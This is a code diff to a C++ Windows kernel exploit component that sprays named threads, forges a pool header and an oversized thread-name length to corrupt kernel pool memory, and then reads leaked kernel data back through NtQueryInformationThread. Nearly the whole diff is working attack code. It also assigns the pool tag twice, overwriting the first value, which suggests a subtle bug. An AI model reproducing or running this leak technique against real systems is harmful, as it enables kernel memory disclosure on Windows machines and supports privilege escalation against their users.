@@ -1,6 +1,11 @@
 
 #include "ThreadNameManager.h"
+#include "functions.h"
 #include "Hvergelmir.h"
+#include <memory>
+
+// Global guard for maximum leak buffer allocation in this translation unit
+static const size_t THREADNAME_MAX_LEAK = 64 * 1024 * 1024; // 64 MB
 
 // exitEvent is created once in the constructor to ensure proper error handling
 static HANDLE exitEvent = NULL;
@@ -30,6 +35,14 @@ ThreadNameManager::ThreadNameManager()
 	_NtQueryInformationThread = (pNtQueryInformationThread)GetProcAddress(ntDLL, "NtQueryInformationThread");
 
 
+
+	// create an event used by dummy threads to wait on and to signal shutdown
+	if (exitEvent == NULL) {
+		exitEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+		if (!exitEvent) {
+			DEBUG_PRINT(" [!] Failed to create exitEvent for ThreadNameManager\n");
+		}
+	}
 }
 
 
@@ -44,11 +57,14 @@ bool ThreadNameManager::GetDataLeak(UINT64 iChunkSize, UINT64 iLeakSize, UINT64 
 
 	leakSize = iLeakSize;
 
-	DEBUG_PRINT("\n [*] ###### Corrupting ThreadName to Leak Data (VOLATILE) ######\n");
+	DEBUG_PRINT("\n [*] #### Corrupting ThreadName to Leak Data (VOLATILE) ####\n");
 
 	ThreadNameOverflow tnOverflow;
 
 	tnOverflow.poolHeader.poolTag = 0x6d4e6854;
+	tnOverflow.poolHeader.blockSize = 0x10;
+	tnOverflow.poolHeader.poolTag = 0x02;
+
 	tnOverflow.threadName.Length = nameSize + leakSize;
 	tnOverflow.threadName.MaximumLength = nameSize + leakSize;
 
@@ -83,6 +99,7 @@ void ThreadNameManager::CreateThreads(UINT64 iThreadCount)
 {
     // Guard against invalid nameSize or missing APIs
 	if (nameSize == 0 || !_NtSetInformationThread) return;
+	if (exitEvent) ResetEvent(exitEvent);
 
 	// Prepare payload and THREAD_NAME_INFORMATION
 	std::vector<WCHAR> payload(nameSize / sizeof(WCHAR));
@@ -100,8 +117,8 @@ void ThreadNameManager::CreateThreads(UINT64 iThreadCount)
 		return;
 	}
 
-	for (UINT64 i = 0; i < iThreadCount; i++) {
-		HANDLE h = CreateThread(NULL, 0, DummyThread, NULL, STACK_SIZE_PARAM_IS_A_RESERVATION, NULL);
+    for (UINT64 i = 0; i < iThreadCount; i++) {
+		HANDLE h = CreateThread(NULL, 0, DummyThread, NULL, 0, NULL);
 		if (h == NULL) {
 			DEBUG_PRINT(" [!] CreateThread failed at index %llu\n", i);
 			threads[i] = NULL;
@@ -116,58 +133,125 @@ void ThreadNameManager::CreateThreads(UINT64 iThreadCount)
 	}
 }
 
-
 HANDLE ThreadNameManager::ScanForCorruptName()
 {
+	if (!_NtQueryInformationThread || nameSize == 0 || threadCount == 0) return NULL;
+
+    size_t bufSize = (size_t)nameSize + (size_t)leakSize + 0x20;
+	if (bufSize == 0 || bufSize > THREADNAME_MAX_LEAK) {
+		DEBUG_PRINT(" [!] Invalid buffer size for ScanForCorruptName: %llu\n", (unsigned long long)bufSize);
+		return NULL;
+	}
+
+	BYTE* buffer = (BYTE*)malloc(bufSize);
+	if (!buffer) {
+		DEBUG_PRINT(" [!] Failed to allocate buffer in ScanForCorruptName\n");
+		return NULL;
+	}
+
 	ULONG returnLength = 0;
-    if (!_NtQueryInformationThread || nameSize == 0) return NULL;
-
-	std::vector<BYTE> buffer((size_t)(nameSize + leakSize));
-
-	for (UINT64 i = 0; i < threadCount; i++)
+	for (UINT64 idx = 0; idx < threadCount; ++idx)
 	{
-		if (threads[i] == NULL) continue;
+		HANDLE t = threads[idx];
+		if (t == NULL || t == INVALID_HANDLE_VALUE) continue;
 
-		NTSTATUS status = _NtQueryInformationThread(threads[i], ThreadNameInformation, buffer.data(), (ULONG)buffer.size(), &returnLength);
+		NTSTATUS status = _NtQueryInformationThread(t, ThreadNameInformation, buffer, (ULONG)bufSize, &returnLength);
 		if (!NT_SUCCESS(status)) continue;
 
 		if (returnLength > nameSize + 0x10) {
-			leakThread = threads[i];
-			return threads[i];
+			leakThread = t;
+			free(buffer);
+			return t;
 		}
 	}
+
+	free(buffer);
 	return NULL;
 }
 
-BYTE* ThreadNameManager::LeakData()
+std::vector<BYTE> ThreadNameManager::LeakData()
 {
-    if (!leakThread) {
+    std::vector<BYTE> empty; 
+	if (!leakThread) {
 		DEBUG_PRINT(" [!] Leak Thread has not yet been Located!\n");
-		return NULL;
+		return empty;
+	}
+    // _NtQueryInformationThread is expected to return leakSize bytes for the leak
+	// guard against absurd sizes
+	if (leakSize == 0 || leakSize > THREADNAME_MAX_LEAK) {
+		DEBUG_PRINT(" [!] Invalid or too large leakSize: %llu\n", (unsigned long long)leakSize);
+		return empty;
 	}
 
-	size_t bufSize = nameSize + leakSize * 2;
-	std::vector<BYTE> data(bufSize);
-	std::vector<BYTE> output(bufSize);
+    // Build an initial buffer with headroom for the Unicode header + leak
+    const size_t MAX_LEAK = 64 * 1024 * 1024; // 64 MB guard
+	const size_t EXTRA_HEADER = 0x100;
+	size_t bufSize = (size_t)nameSize + (size_t)leakSize + EXTRA_HEADER;
+	const size_t MIN_BUF = 64 * 1024; // 64 KB to avoid small buffers
+	if (bufSize < MIN_BUF) bufSize = MIN_BUF;
+	if (bufSize > MAX_LEAK) {
+		DEBUG_PRINT(" [!] Computed bufSize too large: %llu\n", (unsigned long long)bufSize);
+		return empty;
+	}
+
+	if (!_NtQueryInformationThread) return empty;
+
+	std::vector<BYTE> data;
 	ULONG returnLength = 0;
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
 
-	if (!_NtQueryInformationThread) return NULL;
+    const int MAX_ATTEMPTS = 10;
+	int attempt = 0;
 
-	NTSTATUS status = _NtQueryInformationThread(leakThread, ThreadNameInformation, data.data(), (ULONG)bufSize, &returnLength);
-	if (!NT_SUCCESS(status) || returnLength < nameSize + 0x10) {
-		DEBUG_PRINT(" [!] Data Leak Failed!\n");
-		return NULL;
+	while (attempt < MAX_ATTEMPTS) {
+		data.assign(bufSize, 0);
+
+		status = _NtQueryInformationThread(leakThread, ThreadNameInformation, data.data(), (ULONG)bufSize, &returnLength);
+		DEBUG_PRINT(" [*] LeakData attempt %d: status=0x%X returnLength=%lu bufSize=%llu\n", attempt, status, returnLength, (unsigned long long)bufSize);
+		if (NT_SUCCESS(status) && returnLength > 0) break;
+
+        if (status == STATUS_BUFFER_TOO_SMALL || returnLength > (ULONG)bufSize) {
+			size_t newSize = bufSize * 2;
+            if (returnLength > 0) {
+				size_t candidate = (size_t)returnLength + EXTRA_HEADER;
+				newSize = (newSize > candidate) ? newSize : candidate;
+			}
+			if (newSize > THREADNAME_MAX_LEAK) {
+				DEBUG_PRINT(" [!] Required leak buffer too large: %llu\n", (unsigned long long)newSize);
+				break;
+			}
+			bufSize = newSize;
+			attempt++;
+			continue;
+		}
+
+		// other failure
+		break;
 	}
 
-    size_t copyLen = 0;
-	if (returnLength > (ULONG)nameSize) copyLen = (size_t)(returnLength - (ULONG)nameSize);
-	memcpy(output.data(), data.data() + nameSize + 0x18, copyLen);
+	if (!NT_SUCCESS(status) || returnLength == 0) {
+		DEBUG_PRINT(" [!] Data Leak Failed! status=0x%X ret=%lu\n", status, returnLength);
+		return empty;
+	}
 
-	// return a heap buffer that caller must free
-	BYTE* ret = (BYTE*)malloc(copyLen);
-	if (!ret) return NULL;
-	memcpy(ret, output.data(), copyLen);
-	return ret;
+	// Compute copy length after UNICODE_STRING data
+	size_t copyLen = 0;
+	if (returnLength > (ULONG)nameSize + 0x18) {
+		copyLen = (size_t)((ULONG)returnLength - (ULONG)nameSize - 0x18);
+	}
+	std::vector<BYTE> output(copyLen);
+	if (copyLen > 0) memcpy(output.data(), data.data() + nameSize + 0x18, copyLen);
+	return output;
+}
+
+BYTE* ThreadNameManager::LeakDataMalloc()
+{
+	std::vector<BYTE> v = LeakData();
+	if (v.empty()) return NULL;
+	BYTE* ptr = (BYTE*)malloc(v.size());
+	if (!ptr) return NULL;
+	memcpy(ptr, v.data(), v.size());
+	return ptr;
 }
 
 
@@ -206,8 +290,9 @@ void ThreadNameManager::ClearThreads()
 {
     if (exitEvent) SetEvent(exitEvent);
 
-	if (threadCount > 0 && threads) {
-		WaitForMultipleObjects((DWORD)threadCount, threads, TRUE, INFINITE);
+    if (threadCount > 0 && threads) {
+		// wait with timeout to avoid infinite hang; on timeout proceed to best-effort cleanup
+		DWORD waitRes = WaitForMultipleObjects((DWORD)threadCount, threads, TRUE, 5000);
 
 		for (UINT64 i = 0; i < threadCount; i++) {
 			if (threads[i] != NULL && threads[i] != INVALID_HANDLE_VALUE) {
@@ -217,5 +302,7 @@ void ThreadNameManager::ClearThreads()
 		}
 		free(threads);
 		threads = NULL;
+        // reset the exit event so future threads will wait again
+		if (exitEvent) ResetEvent(exitEvent);
 	}
 }
